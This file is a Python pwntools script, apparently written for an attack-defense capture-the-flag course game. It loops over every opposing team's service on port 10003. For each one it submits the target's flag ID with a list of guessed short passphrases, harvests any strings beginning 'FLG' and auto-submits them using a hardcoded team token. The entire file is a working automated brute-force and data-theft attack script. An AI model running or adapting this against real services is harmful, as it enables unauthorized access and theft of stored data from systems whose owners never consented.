from swpag_client import Team
import requests
import json
import pwn

pwn.context.arch = 'amd64'
pwn.context.log_level = 'debug'

t = Team("http://actf3_team.cse545.io", "gMR4zxU0VyuNzKBzdbPD")
passwords= ['1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'ub', 'h', 'j', 'c', 'ea', 'm', 'q', 'd', 'b', 'ja', 'g', 'la', 'o', 'e', 'z']
for password in passwords:
    for team in t.get_targets(3):
        host=team['hostname']
        baby_id=team['flag_id']
        p=pwn.remote(host,'10003')
        try:
            if host=='team19':
                continue
            p.recvuntil('(1-3):')
            #p.recvline() #"Your choice (1-3): "
            #p.clean()
            p.sendline('2')
            p.recvuntil('Baby ID: ')
            p.sendline(baby_id)
            p.recvuntil('passphrase: ')
            p.sendline(password)

            flag=[]

            while True:
                p.recvuntil('FLG')
                fflag=p.recv(13)
                fflag='FLG' + fflag.decode("utf-8")
                flag.append(fflag)
                print(fflag)
                t.submit_flag([fflag])
        except EOFError as error:
            continue
